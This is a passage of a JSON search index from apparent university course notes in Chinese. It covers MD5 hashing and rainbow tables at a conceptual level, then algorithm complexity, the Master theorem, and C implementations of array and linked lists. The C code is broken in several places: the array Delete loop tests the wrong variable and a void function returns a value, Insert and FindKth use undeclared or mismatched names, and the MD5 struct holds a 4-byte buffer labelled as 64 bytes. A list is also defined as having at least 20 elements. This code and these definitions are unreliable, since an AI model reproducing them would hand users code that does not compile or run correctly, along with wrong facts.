"<p>\u57fa\u4e8e\u5185\u5728\u5f62\u72b6\u63d2\u503c\u7684\u591a\u8fb9\u5f62\u6e10\u53d8\u65b9\u6cd5\u7684\u6570\u5b66\u539f\u7406\uff1a\u4e4c\u9f9f\u51e0\u4f55 + Lagrange \u4e58\u6570\u6cd5\u4f18\u5316</p> <p> </p> <p>\u5e73\u65f6\u7684\u968f\u5802\u4f5c\u4e1a \uff08\u4e0a\u9762\u4e0d\u542b\u7684\u5185\u5bb9\uff09</p> <pre><code>title: \u968f\u5802\u4f5c\u4e1a 1 - \u7c92\u5b50\u52a8\u753b\n![](../../Images/2023-11-11-20-25-10.png)\n</code></pre> <pre><code>title: \u968f\u5802\u4f5c\u4e1a 3 - \u7fa4\u7ec4\u52a8\u753b 2\n![](../../Images/2023-11-08-20-19-27.png)\n</code></pre> <pre><code>title: \u968f\u5802\u4f5c\u4e1a 5 - \u5e03\u6599\u52a8\u753b\n![](../../Images/2023-11-08-20-19-33.png)\n</code></pre>"}, {"location": "Course/Crypto/", "title": "\u5bc6\u7801\u5b66", "text": "<p> \u7ea6 34 \u4e2a\u5b57 </p> <p>Note</p> <p>ZJU - \u5bc6\u7801\u5b66 \u8bfe\u7a0b (bhh \u4e13\u573a)</p> <p>References</p> <p>\u73b0\u4ee3\u5bc6\u7801\u5b66\u7b2c\u4e8c\u7248_\u9648\u9c81\u751f</p> <p>\u9700\u8981 ZJU-ip \u767b\u5f55</p> <p>To Be Continued</p>"}, {"location": "Course/Crypto/Lec03/", "title": "MD5", "text": "<p> \u7ea6 268 \u4e2a\u5b57  6 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>MD5 \u662f\u5c06\u660e\u6587\u5904\u7406\u6210 16byte \u7684\u54c8\u5e0c\u6458\u8981</p>"}, {"location": "Course/Crypto/Lec03/#_1", "title": "\u52a0\u5bc6\u8fc7\u7a0b", "text": "\\[ \\begin{aligned} \\rm m&amp;={\\rm md5}(letter)\\\\ \\rm m'&amp;={\\rm rsa}(m,\\rm private\\ key) \\end{aligned} \\]"}, {"location": "Course/Crypto/Lec03/#_2", "title": "\u68c0\u9a8c\u8fc7\u7a0b", "text": "\\[ \\begin{aligned} \\rm md5(letter) == \\rm rsa(m', public\\ key)\\\\ \\end{aligned} \\]"}, {"location": "Course/Crypto/Lec03/#_3", "title": "\u5b9e\u73b0", "text": ""}, {"location": "Course/Crypto/Lec03/#_4", "title": "\u7ed3\u6784\u4f53\u5b9a\u4e49", "text": "<pre><code>typedef struct _MD5_CTX\n{\n    unsigned long state[4];\n    unsigned long count[2]; /* \u5df2\u5904\u7406\u7684\u62a5\u6587\u7684\u4e8c\u8fdb\u5236\u4f4d\u6570,\u6700\u5927\u503c=2^64-1 */\n    unsigned char data[4];  /* 64\u5b57\u8282message\u5757 */\n}\n</code></pre>"}, {"location": "Course/Crypto/Lec03/#init", "title": "Init", "text": "<p>\u5bf9state\u8d4b\u521d\u59cb\u503c\uff0c\u6e05\u7a7acount</p>"}, {"location": "Course/Crypto/Lec03/#update", "title": "Update", "text": "<p>\u6bcf64\u4e2a\u5b57\u8282\u4e3a\u4e00\u7ec4\uff0c\u8fdb\u884c\u5904\u7406\u66f4\u65b0</p>"}, {"location": "Course/Crypto/Lec03/#final", "title": "Final", "text": "<p>\u56e0\u4e3a\u4e0d\u662f\u6240\u6709\u7684\u660e\u6587\u90fd\u662f64\u5b57\u8282\u7684\u500d\u6570\uff0c\u6240\u4ee5\u9700\u8981\u5bf9\u7f3a\u5931\u7684\u5185\u5bb9\u8fdb\u884c\u8865\u5145\uff0c\u8865\u5145\u7684\u5185\u5bb9\u5305\u62ec\u586b\u5145\u7269\u548c\u660e\u6587\u957f\u5ea6</p> <ul> <li>\u586b\u5145\u7269   0x80, 0x00, 0x00, \u2026, 0x00</li> <li>\u89c4\u5219</li> </ul>"}, {"location": "Course/Crypto/Lec03/#_5", "title": "\u7834\u89e3", "text": "<p>MD5\u7684\u7834\u89e3\u5173\u952e\u5728\u4e8e\u627e\u5230Collision</p>"}, {"location": "Course/Crypto/Lec03/#collision", "title": "Collision", "text": "<p>\\({\\rm md5}(x)={\\rm md5}(x') \\ \\ (x\\ne x')\\)</p>"}, {"location": "Course/Crypto/Lec03/#rainbow-table", "title": "rainbow table", "text": "<p>\u4e00\u79cd\u8f83\u5f31\u7684MD5\u7834\u89e3\u65b9\u6cd5\uff0c\u5173\u952e\u5728\u4e8e \u9884\u8ba1\u7b97</p> <ul> <li>\u627eN\u7ec4\u6570\u636e</li> <li>\u5bf9N\u7ec4\u6570\u636e\u5206\u522b\u4f7f\u7528MD5\u5904\u7406K\u8f6e</li> <li>\u5bf9\u76ee\u6807\u6570X\u8fdb\u884cMD5\u5904\u7406\uff0c\u5e76\u5c06\u7ed3\u679c\u4e0eN\u4e2a(\u5904\u7406K\u8f6e\u540e\u7684)\u7ed3\u679c\u8fdb\u884c\u6bd4\u8f83</li> <li>\u82e5X\u4e0e\u5176\u4e2d\u67d0\u4e2a\u6570\u76f8\u7b49\uff0c\u5219\u6839\u636eX\u88abMD5\u5904\u7406\u7684\u8f6e\u6570\u5373\u53ef\u5012\u63a8\u51faCollision</li> <li>\u5426\u5219\u7ee7\u7eed\u5bf9X\u8fdb\u884cMD5\u5904\u7406</li> </ul>"}, {"location": "Course/Crypto/Lec04/", "title": "Lec04", "text": "<p> \u7ea6 0 \u4e2a\u5b57 </p>"}, {"location": "Course/FDS/", "title": "\u6570\u636e\u7ed3\u6784\u57fa\u7840", "text": "<p> \u7ea6 21 \u4e2a\u5b57 </p> <p>Abstract</p> <p>ZJU \u2013 FDS(\u6570\u636e\u7ed3\u6784\u57fa\u7840) \u8bfe\u7a0b\u76f8\u5173\u7b14\u8bb0</p>"}, {"location": "Course/FDS/Lec01/", "title": "\u7b97\u6cd5\u5206\u6790\u548c\u62bd\u8c61\u6570\u636e\u7c7b\u578b", "text": "<p> \u7ea6 1248 \u4e2a\u5b57  14 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p>"}, {"location": "Course/FDS/Lec01/#perface", "title": "Perface", "text": "<ul> <li>clock() \uff1a\u6355\u6349\u4ece\u7a0b\u5e8f\u5f00\u59cb\u8fd0\u884c\u5230 clock() \u88ab\u8c03\u7528\u6240\u8017\u8d39\u7684\u65f6\u95f4\u3002</li> <li>\u8fd9\u4e2a\u65f6\u95f4\u5355\u4f4d\u662f clock tick \uff0c\u5373\u201d\u65f6\u949f\u6253\u70b9\u201c\u3002</li> <li>\u5e38\u6570 CLK_TCK \uff1a\u673a\u5668\u65f6\u949f\u6bcf\u79d2\u6240\u8d70\u7684\u65f6\u949f\u6253\u70b9\u6570\u3002</li> </ul> Note <pre><code>      clock_t start, stop;\n      /* clock_t \u662f clock()\u51fd\u6570\u8fd4\u56de\u7684\u53d8\u91cf\u7c7b\u578b */\n      double duration;\n      /* \u8bb0\u5f55\u88ab\u6d4b\u51fd\u6570\u8fd0\u884c\u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d */\n      int main()\n      {\n          /* \u4e0d\u5728\u6d4b\u8bd5\u8303\u56f4\u5185\u7684\u51c6\u5907\u5de5\u4f5c\u653e\u5728clock()\u8c03\u7528\u4e4b\u524d */\n          start = clock();    /* \u5f00\u59cb\u8ba1\u65f6 */\n          MyFunction();\n          stop = clock();\n          duration = ((double)(stop - start))/CLK_TCK;\n          /* \u5176\u4ed6\u4e0d\u5728\u6d4b\u8bd5\u8303\u56f4\u7684\u5904\u7406\u5199\u5728\u540e\u9762\uff0c\u4f8b\u5982\u8f93\u51faduration\u7684\u503c */\n          return 0;\n      }\n</code></pre>"}, {"location": "Course/FDS/Lec01/#-", "title": "\u7b80\u4ecb-&gt;\u4ec0\u4e48\u662f\u6570\u636e\u7ed3\u6784", "text": ""}, {"location": "Course/FDS/Lec01/#_2", "title": "\u6570\u636e\u5bf9\u8c61\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u7ec4\u7ec7\u65b9\u5f0f", "text": ""}, {"location": "Course/FDS/Lec01/#_3", "title": "\u903b\u8f91\u7ed3\u6784", "text": "<ul> <li>\u4e00\u5bf9\u4e00\u7684\u7ed3\u6784\uff0c\u53eb\u505a\u201d\u7ebf\u6027\u7ed3\u6784\u201c</li> <li>\u4e00\u5bf9\u591a\u7684\u903b\u8f91\u7ed3\u6784\uff0c\u53eb\u505a\u201d\u6811\u578b\u7ed3\u6784\u201c</li> <li>\u591a\u5bf9\u591a\u7684\u590d\u6742\u5173\u7cfb\u7f51\uff0c\u8fd9\u4e2a\u5173\u7cfb\u7f51\u53eb\u505a\u201d\u56fe\u201c</li> </ul>"}, {"location": "Course/FDS/Lec01/#_4", "title": "\u7269\u7406\u5b58\u50a8\u7ed3\u6784 (\u5982\u6570\u7ec4\u5f62\u5f0f\u3001\u94fe\u8868\u5f62\u5f0f \u00b7\u00b7\u00b7", "text": "<p>Note</p> <p>\u63cf\u8ff0\u6570\u636e\u7ed3\u6784</p> <p>\u62bd\u8c61\u6570\u636e\u7c7b\u578b (Abstract Data Type) | ADT</p> <ol> <li>\u6570\u636e\u7c7b\u578b<ol> <li>\u6570\u636e\u5bf9\u8c61\u96c6</li> <li>\u6570\u636e\u96c6\u5408\u76f8\u5173\u8054\u7684\u64cd\u4f5c\u96c6</li> </ol> </li> <li>\u62bd\u8c61\uff1a\u63cf\u8ff0\u6570\u636e\u7c7b\u578b\u7684\u65b9\u6cd5\u4e0d\u4f9d\u8d56\u4e8e\u5177\u4f53\u5b9e\u73b0<ol> <li>\u4e0e\u5b58\u653e\u548c\u6570\u636e\u7684\u673a\u5668\u65e0\u5173</li> <li>\u4e0e\u6570\u636e\u5b58\u50a8\u7684\u7269\u7406\u7ed3\u6784\u65e0\u5173</li> <li>\u4e0e\u5b9e\u73b0\u64cd\u4f5c\u7684\u7b97\u6cd5\u548c\u7f16\u7a0b\u8bed\u8a00\u5747\u65e0\u5173</li> </ol> </li> </ol> <ul> <li>\u53ea\u63cf\u8ff0\u6570\u636e\u5bf9\u8c61\u96c6\u548c\u76f8\u5173\u64cd\u4f5c\u96c6\u201d\u662f\u4ec0\u4e48\u201c\uff0c\u5e76\u4e0d\u6d89\u53ca\u201d\u5982\u4f55\u505a\u5230\u201c\u7684\u95ee\u9898</li> <li>\u5176\u4e2d\u7684\u62bd\u8c61\u53ef\u4ee5\u4ece\u5982\u4e0b\u770b<ul> <li>e.g\uff1aElementType \u662f\u901a\u7528\u6570\u636e\u7c7b\u578b (\u62bd\u8c61)\uff0c\u9700\u8981 double \uff0c\u5728\u524d\u9762 define \u5373\u53ef</li> <li>e.g\uff1a\u77e9\u9635\u662f\u7528\u4e8c\u7ef4\u6570\u7ec4\u3001\u4e00\u7ef4\u6570\u7ec4\u8fd8\u662f\u5341\u5b57\u94fe\u8868\u5b9e\u73b0\u7684\u90fd\u4e0d\u91cd\u8981\uff0c\u53ea\u662f\u5b9e\u73b0\u4e00\u4e2a\u77e9\u9635</li> <li>e.g\uff1aMatrix Add \u4e2d\u4e0d\u5728\u4e4e\u6309\u884c\u52a0\u8fd8\u662f\u6309\u5217\u52a0\uff0c\u7528\u4ec0\u4e48\u8bed\u8a00\u5b9e\u73b0\u90fd\u4e0d\u5728\u4e4e</li> </ul> </li> </ul> <p>\u62bd\u8c61\u7684\u597d\u5904-&gt;\u4e00\u65b9\u9762\u662f\u63d0\u9ad8\u7a0b\u5e8f\u7684\u590d\u7528\u6027\uff0c\u53e6\u4e00\u65b9\u9762\uff0c\u8ba9\u6211\u4eec\u4fa7\u91cd\u53bb\u4e86\u89e3\u7a0b\u5e8f\u7684\u903b\u8f91\u7ed3\u6784</p>"}, {"location": "Course/FDS/Lec01/#_5", "title": "\u7b97\u6cd5\u5206\u6790", "text": ""}, {"location": "Course/FDS/Lec01/#_6", "title": "\u5b9a\u4e49", "text": ""}, {"location": "Course/FDS/Lec01/#algorithm", "title": "\u7b97\u6cd5 (Algorithm)", "text": "<ol> <li>\u4e00\u4e2a\u6709\u9650\u6307\u4ee4\u96c6</li> <li>\u63a5\u53d7\u4e00\u4e9b\u8f93\u5165 (\u6709\u4e9b\u60c5\u51b5\u4e0b\u4e0d\u9700\u8981\u8f93\u5165) </li> <li>\u4ea7\u751f\u8f93\u51fa</li> <li>\u4e00\u5b9a\u5728\u6709\u9650\u6b65\u9aa4\u4e4b\u540e\u7ec8\u6b62</li> <li>\u6bcf\u4e00\u6761\u6307\u4ee4\u5fc5\u987b<ol> <li>\u6709\u5145\u5206\u660e\u786e\u7684\u76ee\u6807\uff0c\u4e0d\u53ef\u4ee5\u4ea7\u751f\u6b67\u4e49</li> <li>\u8ba1\u7b97\u673a\u80fd\u5904\u7406\u7684\u8303\u56f4\u4e4b\u5185</li> <li>\u63cf\u8ff0\u5e94\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u4e00\u79cd\u8ba1\u7b97\u673a\u8bed\u8a00\u53ca\u5177\u4f53\u7684\u5b9e\u73b0\u624b\u6bb5</li> </ol> </li> </ol>"}, {"location": "Course/FDS/Lec01/#_7", "title": "\u8861\u91cf\u7b97\u6cd5\u7684\u4e24\u4e2a\u6307\u6807", "text": ""}, {"location": "Course/FDS/Lec01/#sn", "title": "\u7a7a\u95f4\u590d\u6742\u5ea6 S(n)", "text": "<p>\u6839\u636e\u7b97\u6cd5\u5199\u6210\u7684\u7a0b\u5e8f\u5728\u6267\u884c\u65f6 \u5360\u7528\u5b58\u50a8\u5355\u5143\u7684\u957f\u5ea6 \u3002\u8fd9\u4e2a\u957f\u5ea6\u5f80\u5f80\u4e0e\u8f93\u5165\u6570\u636e\u7684\u89c4\u6a21\u6709\u5173\u3002\u7a7a\u95f4\u590d\u6742\u5ea6\u8fc7\u9ad8\u7684\u7b97\u6cd5\u53ef\u80fd\u5bfc\u81f4\u4f7f\u7528\u7684\u5185\u5b58\u8d85\u9650\uff0c\u9020\u6210\u7a0b\u5e8f\u975e\u6b63\u5e38\u4e2d\u65ad\u3002</p>"}, {"location": "Course/FDS/Lec01/#tn", "title": "\u65f6\u95f4\u590d\u6742\u5ea6 T(n)", "text": "<p>\u6839\u636e\u7b97\u6cd5\u5199\u6210\u7684\u7a0b\u5e8f\u5728\u6267\u884c\u65f6 \u8017\u8d39\u65f6\u95f4\u7684\u957f\u5ea6 \u3002\u8fd9\u4e2a\u957f\u5ea6\u5f80\u5f80\u4e5f\u4e0e\u8f93\u5165\u6570\u636e\u7684\u89c4\u6a21\u6709\u5173\u3002</p>"}, {"location": "Course/FDS/Lec01/#_8", "title": "\u590d\u6742\u5ea6\u7684\u6e10\u8fdb\u8868\u793a\u6cd5", "text": "<ol> <li> <p>\\(T(n) =  O  (f(n))\\) \u8868\u793a\u5b58\u5728\u5e38\u6570 \\(C&gt;0, n_0 &gt; 0\\), \u4f7f\u5f97\u5f53 \\(n \\ge  n_0\\) \u65f6\u6709 \\(T(n) \\le C\u00d7f(n)\\)</p> </li> <li> <p>\\(T(n) =\\Omega(g(n))\\) \u8868\u793a\u5b58\u5728\u5e38\u6570 \\(C&gt;0\uff0cn_0&gt;0\\), \u4f7f\u5f97\u5f53 \\(n \\ge n_0\\) \u65f6\u6709 \\(T(n) \\ge C\u00d7g(n)\\)</p> </li> <li> <p>\\(T(n) =\\Theta(h(n))\\) \u8868\u793a\u540c\u65f6\u6709 \\(T(n) = O(h(n))\\) \u548c \\(T(n) = \\Omega(h(n))\\)</p> </li> </ol>"}, {"location": "Course/FDS/Lec01/#tips", "title": "TIPs", "text": "<ol> <li> <p>\u82e5\u6709\u4e24\u6bb5\u7b97\u6cd5\u5206\u522b\u6709\u590d\u6742\u5ea6 \\(T_1(n) = O(f_1(n))\u548cT_2(n) = O(f_2(n))\\)\uff0c\u5219</p> <ol> <li> <p>\\(T_1(n) + T_2(n) = max(O(f_1(n)), O(f_2(n)))\\) \u8868\u793a\u4e24\u4e2a\u7b97\u6cd5\u62fc\u63a5\u8d77\u6765</p> </li> <li> <p>\\(T_1(n) \\times T_2(n) = O(f_1(n) \\times f_2(n))\\) \u8868\u793a\u4e24\u4e2a\u7b97\u6cd5\u5d4c\u5957\u8d77\u6765</p> </li> </ol> </li> <li> <p>\u82e5 \\(T(n)\\) \u662f\u5173\u4e8en\u7684k\u9636\u591a\u9879\u5f0f\uff0c\u90a3\u4e48 \\(T(n)= \\Theta (n^k)\\)</p> </li> <li> <p>\u4e00\u4e2afor\u5faa\u73af\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u7b49\u4e8e\u5faa\u73af\u6b21\u6570\u4e58\u4ee5\u5faa\u73af\u4f53\u4ee3\u7801\u7684\u590d\u6742\u5ea6</p> </li> <li> <p>if-else\u7ed3\u6784\u7684\u590d\u6742\u5ea6\u53d6\u51b3\u4e8eif\u7684\u6761\u4ef6\u5224\u65ad\u590d\u6742\u5ea6\u548c\u4e24\u4e2a\u5206\u652f\u90e8\u5206\u7684\u590d\u6742\u5ea6\uff0c\u603b\u4f53\u590d\u6742\u5ea6\u53d6\u4e09\u8005\u4e2d\u6700\u5927</p> </li> </ol>"}, {"location": "Course/FDS/Lec01/#checking-your-analysis", "title": "Checking Your Analysis", "text": "<ol> <li> <p>Method 1</p> <ol> <li> <p>When \\(T(N) = O(N)\\), check if \\(T(2N)/T(N)\\approx 2\\) </p> </li> <li> <p>When \\(T(N) = O(N^2)\\), check if \\(T(2N)/T(N)\\approx 4\\) </p> </li> <li> <p>When \\(T(N) = O(N^3)\\), check if \\(T(2N)/T(N)\\approx 8\\) </p> </li> <li> <p>\u00b7\u00b7\u00b7</p> </li> </ol> </li> <li> <p>Method 2</p> <ol> <li>When \\(T(N) = O(f(N))\\), check if \\(\\lim\\limits_{N\\rightarrow\\infty}\\frac{T(N)}{f(N)} \\approx Constant\\)</li> </ol> </li> </ol> <p>Info</p> <p>\u4e00\u4e2a\u5206\u6790\u590d\u6742\u5ea6\u7684\u65b9\u6cd5</p>"}, {"location": "Course/FDS/Lec01/#master", "title": "\u4e3b\u5b9a\u7406 | Master", "text": ""}, {"location": "Course/FDS/Lec01/#_9", "title": "\u4ecb\u7ecd", "text": "<p>Master\u5b9a\u7406\uff0c\u53c8\u79f0\u4e3b\u5b9a\u7406\uff0c\u7528\u4e8e\u7a0b\u5e8f\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u8ba1\u7b97 (\u5e38\u7528\u4e8e\u9012\u5f52\u8c03\u7528\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6) </p>"}, {"location": "Course/FDS/Lec01/#_10", "title": "\u7528\u6cd5", "text": "<p>\u9012\u5f52\u7b97\u6cd5\u65f6\u95f4\u590d\u6742\u5ea6\u5f62\u5982\uff1a</p> <ol> <li> <p>\\(T(n) = O(1), n = 1\\)</p> </li> <li> <p>\\(T(n) = aT(\\frac{n}{b}) + f(n) , n &gt; 1\\)</p> </li> </ol> <p>\u5176\u4e2d\uff0c\\(a \\ge 1; b &gt; 1 ;\\)\\(f(n)\\) \u8868\u793a\u4e0d\u53c2\u4e0e\u9012\u5f52\u90e8\u5206\u7684\u65f6\u95f4\u590d\u6742\u5ea6, \u89c4\u5b9a \\(C_{crit}=log_ba\\)</p> <p>\u7b2c\u4e8c\u6761\u516c\u5f0f\u8868\u793a\uff1a\u5c06\u4e00\u4e2a\u89c4\u6a21\u4e3an\u7684\u95ee\u9898\u5206\u4e3a \\(a\\) \u4e2a\u89c4\u6a21\u4e3a \\(\\frac{n}{b}\\) \u5b50\u95ee\u9898\uff0c\u6bcf\u6b21\u9012\u5f52\u5c06\u5e26\u6765 \\(f(n)\\) \u7684\u989d\u5916\u8ba1\u7b97\uff0c\u7136\u540e\u901a\u8fc7\u5bf9\u8fd9 \\(a\\) \u4e2a\u5b50\u95ee\u9898\u7684\u89e3\u7684\u7efc\u5408\uff0c\u5f97\u5230\u539f\u95ee\u9898\u7684\u89e3</p> <p>\u90a3\u4e48\u6709\uff1a</p> <ol> <li>\u5f53 \\(f(n) = O(n^c)\\) \uff0c\u4e14 \\(c &lt; C_{crit}\\) \u65f6\u6709\uff1a \\(T(n) = \\Theta(n^{C_{crit}})\\) </li> </ol> Example <p>\\(T(n) = 8T(\\frac{n}{2}) + 1000n^2\\)</p> <p>\u6b64\u65f6 \\(a=8, b=2, f(n)=1000n^2\\)</p> <p>\\(c=2&lt;3=log_ba=C_{crit}\\)</p> <p>\u6545 \\(T(n)=\\Theta(n^3)\\)</p> <ol> <li>\u5f53 \\(f(n)=O(n^c)\\) , \u4e14 \\(c &gt; C_{crit}\\) \u65f6\u6709\uff1a\\(T(n)=\\Theta(f(n))\\)</li> </ol> Example <p>\\(T(n) = 2T(\\frac{n}{2}) + n^2\\)</p> <p>\u6b64\u65f6 \\(a=2, b=2, f(n)=n^2\\)</p> <p>\\(c=2 &gt; 1=log_ba=C_{crit}\\)</p> <p>\u6545 \\(T(n)=\\Theta(n^2)\\)</p> <ol> <li> <p>\u5f53 \\(f(n)=O(n^c)\\) , \u4e14 \\(c=C_{crit}\\) \u65f6\uff1a\\(T(n)=\\Theta(n^clog~n)\\)</p> </li> <li> <p>\u82e5\u5b58\u5728\u975e\u8d1f\u6574\u6570 \\(k\\) \uff0c\u4f7f\u5f97 \\(f(n)=\\Theta(n^{C_{crit}}log_kn)\\) \uff0c\u90a3\u4e48 \\(T(n)=\\Theta(n^{C_{crit}}log_{k+1}n)\\)</p> </li> </ol> Quote <ol> <li>\u7b97\u6cd5\u65f6\u95f4\u590d\u6742\u5ea6\u5206\u6790\u65b9\u6cd5 - \u4ee3\u7956\u534e - \u535a\u5ba2\u56ed</li> <li>Master\u5b9a\u7406\u5b66\u4e60\u7b14\u8bb0 - water_mi - \u535a\u5ba2\u56ed</li> </ol>"}, {"location": "Course/FDS/Lec02/", "title": "\u7ebf\u6027\u8868 &amp; \u6808 &amp; \u961f\u5217", "text": "<p> \u7ea6 728 \u4e2a\u5b57  489 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p>"}, {"location": "Course/FDS/Lec02/#lists", "title": "\u7ebf\u6027\u8868 | Lists", "text": ""}, {"location": "Course/FDS/Lec02/#_2", "title": "\u7ebf\u6027\u8868\u7684\u62bd\u8c61\u6570\u636e\u7c7b\u578b\u63cf\u8ff0", "text": "<ol> <li><code>\u7c7b\u578b\u540d\u79f0</code> : \u7ebf\u6027\u8868 | List</li> <li><code>\u6570\u636e\u5bf9\u8c61\u96c6</code> :  \u7ebf\u6027\u8868\u662f n( \\(\\ge\\) 20) \u4e2a\u5143\u7d20\u6784\u6210\u7684\u6709\u5e8f\u5e8f\u5217</li> <li><code>\u64cd\u4f5c\u96c6</code> : \u7ebf\u6027\u8868 L \\(\\in\\) List\uff0c\u6574\u6570 i \u8868\u793a\u4f4d\u7f6e\uff0c\u5143\u7d20 X \\(\\in\\) ElementType.</li> </ol>"}, {"location": "Course/FDS/Lec02/#_3", "title": "\u7ebf\u6027\u8868\u7684\u987a\u5e8f\u5b58\u50a8\u5b9e\u73b0", "text": ""}, {"location": "Course/FDS/Lec02/#_4", "title": "\u7ebf\u6027\u8868\u7684\u6570\u7ec4\u5b58\u50a8\u5b9e\u73b0", "text": "<ul> <li>\u4e3b\u8981\u64cd\u4f5c\u5b9e\u73b0</li> </ul> \u521d\u59cb\u5316 (\u5efa\u7acb\u7a7a\u7684\u987a\u5e8f\u8868) <pre><code>typedef int Position;\ntypedef struct LNode *List;\nstruct LNode {\n    ElementType Data[MAXSIZE];\n    Position Last;\n};\nList MakeEmpty()\n{\n    List Ptrl;\n    Ptrl = (List)malloc(sizeof(struct LNode));\n    Ptrl-&gt;Last = -1;\n    return Ptrl;\n}\n</code></pre> \u67e5\u627e <pre><code>int Find(ElementType X, List Ptrl)\n{\n    int i = 0;\n    while(i &lt;= Ptrl-&gt;Last &amp;&amp; Ptrl-&gt;Data[i] != X)\n    {\n        i++;\n    }\n    if(i &gt; Ptrl-&gt;Last)\n        return -1;\n    else\n        return i;\n}\n</code></pre> \u5728\u7b2c i (1 &lt;= i &lt;= n+1) \u4e2a\u4f4d\u7f6e\u4e0a\u63d2\u5165\u65b0\u5143\u7d20 X <pre><code>void Insert(ElementType X, int i, List L)\n{\n    int j;\n    if(Ptrl-&gt;Last == MAXSIZE-1)\n    {\n        printf(\"\u8868\u6ee1\");\n        return ;\n    }\n    if(i &lt; 1 || i &gt; Ptrl-&gt;Last+2 )\n    {\n        printf(\"\u4f4d\u7f6e\u4e0d\u5408\u6cd5\");\n        return;\n    }\n    for(j = Ptrl-&gt;Last; j &gt;= i - 1; j--)\n    {\n        Ptrl-&gt;Data[j+1] = Ptrl-&gt;Data[j];\n    }\n    Ptrl-&gt;Data[i-1] = X;\n    Ptrl-&gt;Last++;\n    return;   \n}\n</code></pre> \u5220\u9664 <pre><code>void Delete( int i, List Ptrl)\n{\n    int j;\n    if(i &lt; 1 || i &gt; Ptrl-&gt;Last+1)\n    {\n        printf(\"\u4e0d\u5b58\u5728\");\n        return;\n    }\n    for(j = i; i &lt;= Ptrl-&gt;Last; j++)\n    {\n        Ptrl-&gt;Data[j-1] = Ptrl-&gt;Data[j];\n    }\n    Ptrl-&gt;Last--;\n    return E;\n}\n</code></pre>"}, {"location": "Course/FDS/Lec02/#_5", "title": "\u7ebf\u6027\u8868\u7684\u94fe\u8868\u5b58\u50a8\u5b9e\u73b0", "text": "<ul> <li>\u4e0d\u8981\u6c42\u903b\u8f91\u4e0a\u76f8\u90bb\u7684\u4e24\u4e2a\u5143\u7d20\u5728\u7269\u7406\u4e0a\u4e5f\u76f8\u90bb</li> <li>\u901a\u8fc7\u4fee\u6539\u201d\u94fe\u201c\u5efa\u7acb\u8d77\u6570\u636e\u5143\u7d20\u4e4b\u95f4\u903b\u8f91\u5173\u7cfb</li> </ul> <p>Tip</p> <p>\u63d2\u5165\u3001\u5220\u9664\u4e0d\u9700\u8981\u79fb\u52a8\u6570\u636e\u5143\u7d20\uff0c\u53ea\u9700\u8981\u4fee\u6539\u201d\u94fe\u201c</p> \u94fe\u8868\u7ed3\u6784 <pre><code>typedef struct LNode *List;\nstruct LNode{\n    ElementType Data;\n    List Next;\n};\nstruct LNode L;\nList Ptrl;\n</code></pre> <ul> <li>\u4e3b\u8981\u64cd\u4f5c:</li> </ul> \u6c42\u8868\u957f <pre><code>int Length(List Ptrl)\n{\n    List p = Ptrl;\n    int j = 0;\n    while(p)\n    {\n        p = p-&gt;Next;\n        j ++;\n    }\n    return j;\n}\n</code></pre> \u67e5\u627e <pre><code>/*\uff081\uff09\u6309\u5e8f\u53f7\u67e5\u627e*/\nList FindKth(int K, List Ptrl)\n{\n    List p = Ptrl;\n    while(p != NULL &amp;&amp; i &lt; k)\n    {\n        p = p-&gt;Next;\n        i++;\n    }\n    if(i == K)\n        return p;\n    else\n        return NULL;\n}\n\n/*\uff082\uff09\u6309\u503c\u67e5\u627e*/\nList Find(ElementType X, List Ptrl)\n{\n    List p = Ptrl;\n    while(p != NULL &amp;&amp; p-&gt;Data != X)\n    {\n        p = p-&gt;Next;\n    }\n    return p;\n}\n</code></pre> \u5728\u7b2c i-1 (1 &lt;= i &lt;= n+1) \u4e2a\u8282\u70b9\u540e\u63d2\u5165\u4e00\u4e2a\u503c\u4e3a X \u7684\u65b0\u8282\u70b9 <pre><code>List Insert(ElementType X, List Ptrl, int i)\n{\n    List p, s;\n    if(i == 1)\n    {\n        s = (List)malloc(sizeof(struct LNode));\n        s-&gt;Data = X;\n        s-&gt;Next = Ptrl;\n        return s;\n    }\n    p = Findkth(i-1, Ptrl);\n    if(p == NULL)\n    {\n        printf(\"\u53c2\u6570i\u9519\u8bef\");\n        return NULL;\n    }\n    else\n    {\n        s = (List)malloc(sizeof(struct LNode));\n        s-&gt;Data = X;\n        s-&gt;Next = p-&gt;Next;\n        p-&gt;Next = s;\n        return Ptrl;\n    }\n}\n</code></pre> \u5220\u9664\u7b2ci\u4e2a\u8282\u70b9\uff081 &lt;= i &lt;= n\uff09 <pre><code>List Delete(int i, List Ptrl)\n{\n    List p, s;\n    if(i == 1)\n    {\n        s = Ptrl;\n        if( Ptrl != NULL)\n            Ptrl = Ptrl-&gt;Next;\n        else\n            return NULL;\n        free(s);\n        return Ptrl;\n    }\n    p = FindKth(i-1, Ptrl);\n    if( p == NULL)\n    {\n        printf(\"\u7b2c%d\u4e2a\u8282\u70b9\u4e0d\u5b58\u5728\"\uff0ci-1);\n        return NULL;\n    }\n    else if(p-&gt;Next == NULL)\n    {\n        printf(\"\u7b2c%d\u4e2a\u8282\u70b9\u4e0d\u5b58\u5728\"\uff0ci);\n        return NULL;\n    }\n    else\n    {\n        s = p-&gt;Next;\n        p-&gt;Next = s-&gt;Next;\n        free(s);\n        return Ptrl;\n\n    }\n}\n</code></pre>"}, {"location": "Course/FDS/Lec02/#_6", "title": "\u5e7f\u4e49\u8868", "text": "<ul> <li>\u5e7f\u4e49\u8868\u662f\u7ebf\u6027\u8868\u7684\u63a8\u5e7f</li> <li>\u5bf9\u4e8e\u7ebf\u6027\u8868\u6765\u8bf4\uff0cn \u4e2a\u5143\u7d20\u90fd\u662f\u57fa\u672c\u7684\u5355\u5143\u7d20</li> <li>\u5e7f\u4e49\u8868\u4e2d\uff0c\u8fd9\u4e9b\u5143\u7d20\u4e0d\u4ec5\u53ef\u4ee5\u662f\u5355\u5143\u7d20\u8fd8\u53ef\u4ee5\u662f\u53e6\u4e00\u4e2a\u5e7f\u4e49\u8868</li> </ul> \u5e7f\u4e49\u8868\u7ed3\u6784 <pre><code>typedef struct GNode 